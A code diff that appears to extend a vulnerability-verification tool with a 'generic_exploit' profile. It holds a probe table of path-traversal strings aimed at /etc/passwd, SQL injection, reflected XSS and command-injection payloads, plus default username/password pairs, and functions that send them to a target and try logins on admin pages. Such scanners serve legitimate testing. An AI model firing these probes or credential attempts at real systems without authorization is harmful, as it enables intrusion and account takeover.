@@ -27,6 +27,58 @@ DVWA_FI_MARKERS = [
 ]
 JSON_RPC_COMMON_PATHS = ["/jsonrpc", "/rpc", "/api/jsonrpc"]
 
+GENERIC_EXPLOIT_PROBES = {
+    "path_traversal": {
+        "paths": [
+            "/../../etc/passwd",
+            "/....//....//etc/passwd",
+            "/..%2f..%2f..%2fetc/passwd",
+        ],
+        "markers": ["root:", "daemon:", "nobody:"],
+    },
+    "sqli_error": {
+        "injections": [
+            ("'", "SQL syntax"),
+            ('"', "SQL syntax"),
+            ("' OR '1'='1", "syntax"),
+        ],
+        "error_patterns": [
+            "SQL syntax",
+            "mysql_fetch",
+            "PostgreSQL",
+            "SQLite",
+            "ORA-",
+            "JDBC",
+        ],
+    },
+    "xss_reflect": {
+        "payloads": [
+            "<script>alert(1)</script>",
+            "\"><script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
+        ],
+    },
+    "command_injection": {
+        "payloads": ["; id", "| id", "`id`", "$(id)", "&& id"],
+        "markers": ["uid=", "gid=", "root:"],
+    },
+    "default_credentials": {
+        "targets": [
+            "/admin",
+            "/login",
+            "/phpmyadmin",
+            "/wp-admin",
+            "/manager/html",
+        ],
+        "combos": [
+            ("admin", "admin"),
+            ("admin", "password"),
+            ("root", "root"),
+            ("admin", "admin123"),
+        ],
+    },
+}
+
 
 @dataclass(slots=True)
 class ScannerRun:
@@ -113,6 +165,35 @@ def execute(params: VulnerabilityVerifyInput, context: ToolContext) -> ToolExecu
             )
         elif nikto_run.success or probe_run.success:
             verification_status = "not_reproduced"
+    elif profile == "generic_exploit":
+        ge_runs, ge_findings, ge_pocs = _run_generic_exploit(params, context.artifact_dir)
+        scanner_runs.extend(ge_runs)
+        for ge_run in ge_runs:
+            evidence.append(
+                {
+                    "kind": f"generic_exploit_{ge_run.name}",
+                    "target": params.target,
+                    "port": params.port,
+                    "summary": ge_run.summary,
+                    "data": ge_run.data,
+                }
+            )
+        findings.extend(ge_findings)
+        pocs.extend(ge_pocs)
+        extra_artifact_paths.extend(
+            artifact_path
+            for ge_run in ge_runs
+            for artifact_path in ge_run.data.get("artifact_paths", [])
+            if isinstance(artifact_path, str)
+        )
+        if ge_pocs:
+            verification_status = "confirmed"
+        elif ge_findings:
+            verification_status = "suspected"
+        elif (nikto_run and nikto_run.success) or any(run.success for run in ge_runs):
+            verification_status = "profiled"
+        else:
+            verification_status = "inconclusive"
     elif profile != "json_rpc":
         dvwa_signals = _collect_php_apache_signals(params)
         if dvwa_signals:
@@ -215,6 +296,21 @@ def _select_profile(params: VulnerabilityVerifyInput) -> str:
     header_text = " ".join(f"{key}:{value}" for key, value in params.headers.items()).lower()
     path_text = " ".join(params.interesting_paths).lower()
 
+    # Port-based heuristics: identify service type by port number
+    port = params.port
+    if port == 3306:
+        return "generic_exploit"
+    if port == 5432:
+        return "generic_exploit"
+    if port == 6379:
+        return "generic_exploit"
+    if port == 27017:
+        return "generic_exploit"
+    if port == 22:
+        return "generic_exploit"
+    if port == 21:
+        return "generic_exploit"
+
     if "mini_httpd" in service_text:
         return "mini_httpd"
     if any(marker in service_text for marker in ["aria2", "json-rpc", "json rpc", "xml-rpc"]):
@@ -227,7 +323,7 @@ def _select_profile(params: VulnerabilityVerifyInput) -> str:
         return "php_apache"
     if "phpinfo" in path_text or "login.php" in path_text or "setup.php" in path_text:
         return "php_apache"
-    return "generic_web"
+    return "generic_exploit"
 
 
 def _run_nikto(url: str, profile: str, timeout: int, artifact_dir: Path) -> ScannerRun:
@@ -325,7 +421,7 @@ def _run_mini_httpd_probe(target: str, port: int, artifact_dir: Path) -> Scanner
         "\r\n"
     )
     try:
-        response = _send_raw_http_request(target, port, request)
+        response = _send_raw_http_request(target, port, request, timeout=10)
     except OSError as exc:
         return ScannerRun(
             name="mini_httpd_empty_host_probe",
@@ -560,9 +656,9 @@ def _json_rpc_probe_methods(service_text: str) -> list[tuple[str, dict[str, Any]
     return dedup
 
 
-def _send_raw_http_request(target: str, port: int, request: str) -> str:
-    with socket.create_connection((target, port), timeout=5) as sock:
-        sock.settimeout(5)
+def _send_raw_http_request(target: str, port: int, request: str, timeout: int = 10) -> str:
+    with socket.create_connection((target, port), timeout=timeout) as sock:
+        sock.settimeout(timeout)
         sock.sendall(request.encode("latin1"))
         chunks: list[bytes] = []
         while True:
@@ -627,6 +723,610 @@ def _findings_from_nikto(issues: list[dict[str, str]]) -> list[dict[str, str]]:
                 }
             )
     return findings
+
+
+# ---------------------------------------------------------------------------
+# generic_exploit probes
+# ---------------------------------------------------------------------------
+
+def _run_generic_exploit(
+    params: VulnerabilityVerifyInput,
+    artifact_dir: Path,
+) -> tuple[list[ScannerRun], list[dict[str, str]], list[dict[str, Any]]]:
+    """Run a battery of generic web-exploit probes against the target."""
+    url = f"{params.scheme}://{params.target}:{params.port}"
+    scanner_runs: list[ScannerRun] = []
+    findings: list[dict[str, str]] = []
+    pocs: list[dict[str, Any]] = []
+    request_timeout = min(params.timeout, 15)
+
+    # 1. Path Traversal
+    pt_run = _probe_path_traversal(url, request_timeout, artifact_dir)
+    scanner_runs.append(pt_run)
+    findings.extend(pt_run.data.get("findings", []))
+    pocs.extend(pt_run.data.get("pocs", []))
+
+    # 2. SQLi Error Detection
+    sqli_run = _probe_sqli_error(url, request_timeout, artifact_dir)
+    scanner_runs.append(sqli_run)
+    findings.extend(sqli_run.data.get("findings", []))
+    pocs.extend(sqli_run.data.get("pocs", []))
+
+    # 3. XSS Reflection Detection
+    xss_run = _probe_xss_reflect(url, request_timeout, artifact_dir)
+    scanner_runs.append(xss_run)
+    findings.extend(xss_run.data.get("findings", []))
+    pocs.extend(xss_run.data.get("pocs", []))
+
+    # 4. Command Injection Detection
+    cmd_run = _probe_command_injection(url, request_timeout, artifact_dir)
+    scanner_runs.append(cmd_run)
+    findings.extend(cmd_run.data.get("findings", []))
+    pocs.extend(cmd_run.data.get("pocs", []))
+
+    # 5. Default Credentials Detection
+    cred_run = _probe_default_credentials(url, request_timeout, artifact_dir)
+    scanner_runs.append(cred_run)
+    findings.extend(cred_run.data.get("findings", []))
+    pocs.extend(cred_run.data.get("pocs", []))
+
+    return scanner_runs, findings, pocs
+
+
+def _probe_path_traversal(
+    url: str, timeout: int, artifact_dir: Path
+) -> ScannerRun:
+    """Test path traversal payloads and check for /etc/passwd markers."""
+    cfg = GENERIC_EXPLOIT_PROBES["path_traversal"]
+    probes: list[dict[str, Any]] = []
+    vuln_found = False
+
+    for traversal_path in cfg["paths"]:
+        target_url = url.rstrip("/") + quote(traversal_path, safe="%/")
+        try:
+            resp = requests.get(target_url, timeout=timeout, allow_redirects=False, verify=False)
+        except requests.RequestException as exc:
+            probes.append({"url": target_url, "status": "error", "detail": str(exc)})
+            continue
+
+        body = resp.text
+        matched = [m for m in cfg["markers"] if m in body]
+        probes.append(
+            {
+                "url": target_url,
+                "status_code": resp.status_code,
+                "matched_markers": matched,
+                "body_preview": body[:300],
+            }
+        )
+        if matched:
+            vuln_found = True
+
+    findings: list[dict[str, str]] = []
+    pocs: list[dict[str, Any]] = []
+    if vuln_found:
+        findings.append(
+            {
+                "title": "Path traversal probe returned /etc/passwd markers",
+                "severity": "high",
+                "confidence": "confirmed",
+                "evidence_summary": "One or more traversal payloads resulted in a response containing passwd file entries.",
+            }
+        )
+        for probe in probes:
+            if probe.get("matched_markers"):
+                pocs.append(
+                    {
+                        "id": "generic-path-traversal",
+                        "title": "Path Traversal – /etc/passwd disclosure",
+                        "module": "path_traversal",
+                        "status": "confirmed",
+                        "method": "GET",
+                        "url": probe["url"],
+                        "path": urlparse(probe["url"]).path or "/",
+                        "params": {},
+                        "request_excerpt": f"GET {urlparse(probe['url']).path} HTTP/1.1",
+                        "response_excerpt": probe.get("body_preview", "")[:400],
+                        "success_evidence": probe.get("matched_markers", []),
+                        "notes": [
+                            "A generic path traversal payload caused the server to return /etc/passwd entry markers."
+                        ],
+                        "evidence_files": [],
+                    }
+                )
+                break
+
+    artifact_path = artifact_dir / "generic_path_traversal.json"
+    artifact_path.write_text(json.dumps(probes, indent=2), encoding="utf-8")
+
+    summary = (
+        f"Path traversal probe confirmed passwd disclosure ({sum(1 for p in probes if p.get('matched_markers'))}/{len(probes)})."
+        if vuln_found
+        else f"Path traversal probe tested {len(probes)} payload(s); no passwd markers returned."
+    )
+    return ScannerRun(
+        name="path_traversal",
+        success=True,
+        summary=summary,
+        data={
+            "probes": probes,
+            "findings": findings,
+            "pocs": pocs,
+            "artifact_paths": [str(artifact_path)],
+        },
+    )
+
+
+def _probe_sqli_error(
+    url: str, timeout: int, artifact_dir: Path
+) -> ScannerRun:
+    """Inject SQL metacharacters into URL query params and check for DB error echoes."""
+    cfg = GENERIC_EXPLOIT_PROBES["sqli_error"]
+    probes: list[dict[str, Any]] = []
+    vuln_found = False
+
+    base_parsed = urlparse(url)
+    base_query_params: dict[str, str] = {}
+    if base_parsed.query:
+        for pair in base_parsed.query.split("&"):
+            if "=" in pair:
+                k, v = pair.split("=", 1)
+                base_query_params[k] = v
+            else:
+                base_query_params[pair] = ""
+
+    if not base_query_params:
+        base_query_params["id"] = "1"
+
+    for payload, _desc in cfg["injections"]:
+        for param_name in list(base_query_params.keys()):
+            injected = dict(base_query_params)
+            injected[param_name] = base_query_params[param_name] + payload
+            query_string = "&".join(f"{k}={quote(str(v))}" for k, v in injected.items())
+            probe_url = f"{base_parsed.scheme}://{base_parsed.netloc}{base_parsed.path or '/'}?{query_string}"
+
+            try:
+                resp = requests.get(probe_url, timeout=timeout, allow_redirects=False, verify=False)
+            except requests.RequestException as exc:
+                probes.append({"url": probe_url, "status": "error", "detail": str(exc)})
+                continue
+
+            body_lower = resp.text.lower()
+            matched_errors = [ep for ep in cfg["error_patterns"] if ep.lower() in body_lower]
+            probes.append(
+                {
+                    "url": probe_url,
+                    "status_code": resp.status_code,
+                    "payload": payload,
+                    "param": param_name,
+                    "matched_errors": matched_errors,
+                    "body_preview": resp.text[:300],
+                }
+            )
+            if matched_errors:
+                vuln_found = True
+                break
+        if vuln_found:
+            break
+
+    findings: list[dict[str, str]] = []
+    pocs: list[dict[str, Any]] = []
+
+    if vuln_found:
+        findings.append(
+            {
+                "title": "SQL error leaked in response after parameter injection",
+                "severity": "medium",
+                "confidence": "suspected",
+                "evidence_summary": "Injecting SQL metacharacters into a query parameter caused a DB error message to appear in the response.",
+            }
+        )
+        for probe in probes:
+            if probe.get("matched_errors"):
+                pocs.append(
+                    {
+                        "id": "generic-sqli-error",
+                        "title": "SQL Injection – Error-based detection",
+                        "module": "sqli_error",
+                        "status": "suspected",
+                        "method": "GET",
+                        "url": probe["url"],
+                        "path": urlparse(probe["url"]).path or "/",
+                        "params": {probe.get("param", ""): probe.get("payload", "")},
+                        "request_excerpt": f"GET {urlparse(probe['url']).path}?{probe.get('param', '')}={quote(probe.get('payload', ''))} HTTP/1.1",
+                        "response_excerpt": probe.get("body_preview", "")[:400],
+                        "success_evidence": probe.get("matched_errors", []),
+                        "notes": [
+                            "SQL error patterns were observed in the response after injecting a metacharacter."
+                        ],
+                        "evidence_files": [],
+                    }
+                )
+                break
+
+    artifact_path = artifact_dir / "generic_sqli_error.json"
+    artifact_path.write_text(json.dumps(probes, indent=2), encoding="utf-8")
+
+    summary = (
+        f"SQLi error probe confirmed DB error echoes ({sum(1 for p in probes if p.get('matched_errors'))}/{len(probes)})."
+        if vuln_found
+        else f"SQLi error probe tested {len(probes)} payload/param combination(s); no DB error echoes detected."
+    )
+    return ScannerRun(
+        name="sqli_error",
+        success=True,
+        summary=summary,
+        data={
+            "probes": probes,
+            "findings": findings,
+            "pocs": pocs,
+            "artifact_paths": [str(artifact_path)],
+        },
+    )
+
+
+def _probe_xss_reflect(
+    url: str, timeout: int, artifact_dir: Path
+) -> ScannerRun:
+    """Inject XSS payloads into URL query params and check for reflection."""
+    cfg = GENERIC_EXPLOIT_PROBES["xss_reflect"]
+    probes: list[dict[str, Any]] = []
+    vuln_found = False
+
+    base_parsed = urlparse(url)
+    # Try both an existing param injection and a standalone q= param
+    test_params: list[dict[str, str]] = []
+    if base_parsed.query:
+        base_params: dict[str, str] = {}
+        for pair in base_parsed.query.split("&"):
+            if "=" in pair:
+                k, v = pair.split("=", 1)
+                base_params[k] = v
+        for pname in list(base_params.keys())[:2]:
+            test_params.append({pname: ""})
+    test_params.append({"q": ""})
+
+    for payload in cfg["payloads"]:
+        for param_set in test_params:
+            injected = dict(param_set)
+            for param_name in injected:
+                injected[param_name] = payload
+            query_string = "&".join(f"{k}={quote(str(v), safe='<>')}" for k, v in injected.items())
+            probe_url = f"{base_parsed.scheme}://{base_parsed.netloc}{base_parsed.path or '/'}?{query_string}"
+
+            try:
+                resp = requests.get(probe_url, timeout=timeout, allow_redirects=False, verify=False)
+            except requests.RequestException as exc:
+                probes.append({"url": probe_url, "status": "error", "detail": str(exc)})
+                continue
+
+            reflected = payload in resp.text
+            probes.append(
+                {
+                    "url": probe_url,
+                    "status_code": resp.status_code,
+                    "payload": payload,
+                    "reflected": reflected,
+                    "body_preview": resp.text[:500],
+                }
+            )
+            if reflected:
+                vuln_found = True
+                break
+        if vuln_found:
+            break
+
+    findings: list[dict[str, str]] = []
+    pocs: list[dict[str, Any]] = []
+
+    if vuln_found:
+        findings.append(
+            {
+                "title": "XSS payload reflected in HTTP response",
+                "severity": "medium",
+                "confidence": "suspected",
+                "evidence_summary": "An injected script payload was reflected verbatim in the server response.",
+            }
+        )
+        for probe in probes:
+            if probe.get("reflected"):
+                pocs.append(
+                    {
+                        "id": "generic-xss-reflected",
+                        "title": "Cross-Site Scripting – Reflected payload",
+                        "module": "xss_reflect",
+                        "status": "suspected",
+                        "method": "GET",
+                        "url": probe["url"],
+                        "path": urlparse(probe["url"]).path or "/",
+                        "params": {"q": probe.get("payload", "")},
+                        "request_excerpt": f"GET {urlparse(probe['url']).path}?q={quote(probe.get('payload', ''), safe='<>')} HTTP/1.1",
+                        "response_excerpt": probe.get("body_preview", "")[:400],
+                        "success_evidence": [f"Payload '{probe.get('payload', '')}' reflected in response body."],
+                        "notes": [
+                            "An injected XSS payload was reflected in the response body without sanitization."
+                        ],
+                        "evidence_files": [],
+                    }
+                )
+                break
+
+    artifact_path = artifact_dir / "generic_xss_reflect.json"
+    artifact_path.write_text(json.dumps(probes, indent=2), encoding="utf-8")
+
+    summary = (
+        f"XSS reflection probe confirmed payload echo ({sum(1 for p in probes if p.get('reflected'))}/{len(probes)})."
+        if vuln_found
+        else f"XSS reflection probe tested {len(probes)} payload combination(s); no reflection detected."
+    )
+    return ScannerRun(
+        name="xss_reflect",
+        success=True,
+        summary=summary,
+        data={
+            "probes": probes,
+            "findings": findings,
+            "pocs": pocs,
+            "artifact_paths": [str(artifact_path)],
+        },
+    )
+
+
+def _probe_command_injection(
+    url: str, timeout: int, artifact_dir: Path
+) -> ScannerRun:
+    """Inject command-shell metacharacters and check for id command output."""
+    cfg = GENERIC_EXPLOIT_PROBES["command_injection"]
+    probes: list[dict[str, Any]] = []
+    vuln_found = False
+
+    base_parsed = urlparse(url)
+    base_params: dict[str, str] = {}
+    if base_parsed.query:
+        for pair in base_parsed.query.split("&"):
+            if "=" in pair:
+                k, v = pair.split("=", 1)
+                base_params[k] = v
+
+    if not base_params:
+        base_params["cmd"] = "whoami"
+
+    for payload in cfg["payloads"]:
+        for param_name in list(base_params.keys()):
+            injected = dict(base_params)
+            injected[param_name] = base_params[param_name] + payload
+            query_string = "&".join(f"{k}={quote(str(v), safe=';|`$&')}" for k, v in injected.items())
+            probe_url = f"{base_parsed.scheme}://{base_parsed.netloc}{base_parsed.path or '/'}?{query_string}"
+
+            try:
+                resp = requests.get(probe_url, timeout=timeout, allow_redirects=False, verify=False)
+            except requests.RequestException as exc:
+                probes.append({"url": probe_url, "status": "error", "detail": str(exc)})
+                continue
+
+            body_lower = resp.text.lower()
+            matched = [m for m in cfg["markers"] if m.lower() in body_lower]
+            probes.append(
+                {
+                    "url": probe_url,
+                    "status_code": resp.status_code,
+                    "payload": payload,
+                    "param": param_name,
+                    "matched_markers": matched,
+                    "body_preview": resp.text[:500],
+                }
+            )
+            if matched:
+                vuln_found = True
+                break
+        if vuln_found:
+            break
+
+    findings: list[dict[str, str]] = []
+    pocs: list[dict[str, Any]] = []
+
+    if vuln_found:
+        findings.append(
+            {
+                "title": "Command injection triggered id/whoami output in response",
+                "severity": "high",
+                "confidence": "confirmed",
+                "evidence_summary": "A command-shell metacharacter injected into a URL parameter caused the server to return uid/gid markers.",
+            }
+        )
+        for probe in probes:
+            if probe.get("matched_markers"):
+                pocs.append(
+                    {
+                        "id": "generic-command-injection",
+                        "title": "Command Injection – id command output",
+                        "module": "command_injection",
+                        "status": "confirmed",
+                        "method": "GET",
+                        "url": probe["url"],
+                        "path": urlparse(probe["url"]).path or "/",
+                        "params": {probe.get("param", ""): probe.get("payload", "")},
+                        "request_excerpt": f"GET {urlparse(probe['url']).path}?{probe.get('param', '')}={quote(probe.get('payload', ''), safe=';|`$&')} HTTP/1.1",
+                        "response_excerpt": probe.get("body_preview", "")[:400],
+                        "success_evidence": probe.get("matched_markers", []),
+                        "notes": [
+                            "Command injection payload produced uid=/gid= markers in the response body."
+                        ],
+                        "evidence_files": [],
+                    }
+                )
+                break
+
+    artifact_path = artifact_dir / "generic_command_injection.json"
+    artifact_path.write_text(json.dumps(probes, indent=2), encoding="utf-8")
+
+    summary = (
+        f"Command injection probe confirmed execution markers ({sum(1 for p in probes if p.get('matched_markers'))}/{len(probes)})."
+        if vuln_found
+        else f"Command injection probe tested {len(probes)} payload/param combination(s); no execution markers detected."
+    )
+    return ScannerRun(
+        name="command_injection",
+        success=True,
+        summary=summary,
+        data={
+            "probes": probes,
+            "findings": findings,
+            "pocs": pocs,
+            "artifact_paths": [str(artifact_path)],
+        },
+    )
+
+
+def _probe_default_credentials(
+    url: str, timeout: int, artifact_dir: Path
+) -> ScannerRun:
+    """Attempt common default credentials against standard admin/login endpoints."""
+    cfg = GENERIC_EXPLOIT_PROBES["default_credentials"]
+    probes: list[dict[str, Any]] = []
+    vuln_found = False
+
+    for target_path in cfg["targets"]:
+        endpoint = url.rstrip("/") + target_path
+        for username, password in cfg["combos"]:
+            try:
+                # Try both GET with basic auth and POST form
+                # Basic auth attempt
+                resp = requests.get(
+                    endpoint,
+                    auth=(username, password),
+                    timeout=timeout,
+                    allow_redirects=False,
+                    verify=False,
+                )
+                auth_success = resp.status_code in (200, 301, 302) and resp.status_code != 401
+
+                probes.append(
+                    {
+                        "endpoint": endpoint,
+                        "method": "GET (Basic Auth)",
+                        "username": username,
+                        "password": password,
+                        "status_code": resp.status_code,
+                        "content_length": len(resp.text),
+                        "likely_success": auth_success,
+                    }
+                )
+
+                if auth_success and resp.status_code != 401:
+                    # Quick check: if the response body looks like a login page, it's probably not a real success
+                    body_lower = resp.text[:2000].lower()
+                    login_indicators = ["password", "login", "sign in", "log in", "username"]
+                    if not any(ind in body_lower for ind in login_indicators):
+                        vuln_found = True
+                        break
+
+                # Also try POST with form-encoded credentials (common pattern)
+                try:
+                    resp_post = requests.post(
+                        endpoint,
+                        data={"username": username, "password": password},
+                        timeout=timeout,
+                        allow_redirects=False,
+                        verify=False,
+                    )
+                    post_success = resp_post.status_code in (200, 301, 302) and resp_post.status_code != 401
+                    probes.append(
+                        {
+                            "endpoint": endpoint,
+                            "method": "POST (form)",
+                            "username": username,
+                            "password": password,
+                            "status_code": resp_post.status_code,
+                            "content_length": len(resp_post.text),
+                            "likely_success": post_success,
+                        }
+                    )
+                    if post_success and resp_post.status_code != 401:
+                        body_lower = resp_post.text[:2000].lower()
+                        login_indicators = ["password", "login", "sign in", "log in", "username"]
+                        if not any(ind in body_lower for ind in login_indicators):
+                            vuln_found = True
+                            break
+                except requests.RequestException:
+                    pass
+
+            except requests.RequestException:
+                probes.append(
+                    {
+                        "endpoint": endpoint,
+                        "method": "GET (Basic Auth)",
+                        "username": username,
+                        "password": password,
+                        "status": "error",
+                        "detail": "Connection failed",
+                    }
+                )
+                continue
+
+        if vuln_found:
+            break
+
+    findings: list[dict[str, str]] = []
+    pocs: list[dict[str, Any]] = []
+
+    if vuln_found:
+        findings.append(
+            {
+                "title": "Default credentials accepted by the target",
+                "severity": "high",
+                "confidence": "confirmed",
+                "evidence_summary": "A default username/password combination was accepted by an admin endpoint.",
+            }
+        )
+        for probe in probes:
+            if probe.get("likely_success"):
+                pocs.append(
+                    {
+                        "id": "generic-default-credentials",
+                        "title": "Default Credentials – Authentication bypass",
+                        "module": "default_credentials",
+                        "status": "confirmed",
+                        "method": probe.get("method", "GET"),
+                        "url": probe["endpoint"],
+                        "path": urlparse(probe["endpoint"]).path or "/",
+                        "params": {"username": probe.get("username", ""), "password": "<redacted>"},
+                        "request_excerpt": f"{probe.get('method', 'GET')} {urlparse(probe['endpoint']).path} HTTP/1.1\nAuthorization: Basic <redacted>",
+                        "response_excerpt": f"HTTP {probe.get('status_code', 0)}",
+                        "success_evidence": [f"Authenticated as {probe.get('username', '')} on {probe['endpoint']} (HTTP {probe.get('status_code', 0)})."],
+                        "notes": [
+                            f"Default credentials ({probe.get('username', '')}/{probe.get('password', '')}) granted access to {probe['endpoint']}."
+                        ],
+                        "evidence_files": [],
+                    }
+                )
+                break
+
+    artifact_path = artifact_dir / "generic_default_credentials.json"
+    artifact_path.write_text(json.dumps(probes, indent=2), encoding="utf-8")
+
+    successes = sum(1 for p in probes if p.get("likely_success"))
+    summary = (
+        f"Default credential probe confirmed accepted credentials ({successes}/{len(probes)})."
+        if vuln_found
+        else f"Default credential probe tested {len(probes)} combination(s); no defaults accepted."
+    )
+    return ScannerRun(
+        name="default_credentials",
+        success=True,
+        summary=summary,
+        data={
+            "probes": probes,
+            "findings": findings,
+            "pocs": pocs,
+            "artifact_paths": [str(artifact_path)],
+        },
+    )
+
+
+# ---------------------------------------------------------------------------
+# PHP / Apache helpers
+# ---------------------------------------------------------------------------
 
 
 def _collect_php_apache_signals(params: VulnerabilityVerifyInput) -> list[str]:
@@ -1031,6 +1731,10 @@ def _build_summary(
     if verification_status == "profiled":
         return (
             f"Profile {profile} completed against {url} with {len(findings)} structured observation(s)."
+        )
+    if verification_status == "suspected":
+        return (
+            f"Profile {profile} completed against {url} with {len(findings)} suspected finding(s) that require manual review."
         )
     return f"Profile {profile} produced an inconclusive verification result against {url}."
 
